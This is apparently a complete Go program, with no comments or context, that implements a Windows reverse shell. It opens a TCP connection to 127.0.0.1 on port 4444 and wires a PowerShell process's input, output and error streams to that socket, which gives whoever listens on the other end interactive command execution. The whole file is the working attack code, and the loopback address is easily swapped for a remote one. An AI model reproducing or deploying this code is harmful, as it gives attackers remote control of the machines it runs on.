package main;

import"os/exec";
import"net";

func main(){
        c,_:=net.Dial("tcp","127.0.0.1:4444");
        cmd:=exec.Command("powershell");
        cmd.Stdin=c;
        cmd.Stdout=c;
        cmd.Stderr=c;
        cmd.Run()
}